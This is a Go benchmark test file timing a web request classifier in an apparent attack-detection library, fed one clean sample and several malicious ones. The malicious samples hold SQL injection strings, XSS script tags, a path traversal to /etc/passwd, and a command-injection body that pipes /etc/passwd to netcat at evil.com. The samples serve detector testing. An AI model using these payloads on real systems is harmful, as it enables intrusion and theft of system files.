package detection

import (
	"testing"

	sentinel "github.com/MUKE-coder/sentinel/core"
)

func BenchmarkClassifyRequest_Clean(b *testing.B) {
	req := sentinel.InspectedRequest{
		Path:     "/api/users/123",
		RawQuery: "page=1&limit=20",
		Headers:  map[string][]string{"Content-Type": {"application/json"}},
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ClassifyRequest(req)
	}
}

func BenchmarkClassifyRequest_SQLi(b *testing.B) {
	req := sentinel.InspectedRequest{
		Path:     "/api/users",
		RawQuery: "id=1' OR '1'='1",
		Headers:  map[string][]string{"Content-Type": {"application/json"}},
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ClassifyRequest(req)
	}
}

func BenchmarkClassifyRequest_XSS(b *testing.B) {
	req := sentinel.InspectedRequest{
		Path:     "/api/search",
		RawQuery: "q=<script>alert('xss')</script>",
		Headers:  map[string][]string{"Content-Type": {"application/json"}},
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ClassifyRequest(req)
	}
}

func BenchmarkClassifyRequest_MultiplePatterns(b *testing.B) {
	req := sentinel.InspectedRequest{
		Path:     "/api/../../../etc/passwd",
		RawQuery: "id=1; DROP TABLE users--",
		Headers: map[string][]string{
			"Content-Type": {"application/json"},
			"User-Agent":   {"<script>alert(1)</script>"},
		},
		Body: "; cat /etc/passwd | nc evil.com 1234",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ClassifyRequest(req)
	}
}

func BenchmarkClassifyRequest_LargeBody(b *testing.B) {
	// Simulate a large but clean JSON body
	body := `{"users":[`
	for i := 0; i < 100; i++ {
		if i > 0 {
			body += ","
		}
		body += `{"id":` + string(rune('0'+i%10)) + `,"name":"User","email":"user@example.com"}`
	}
	body += `]}`

	req := sentinel.InspectedRequest{
		Path:     "/api/batch",
		RawQuery: "",
		Headers:  map[string][]string{"Content-Type": {"application/json"}},
		Body:     body,
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ClassifyRequest(req)
	}
}
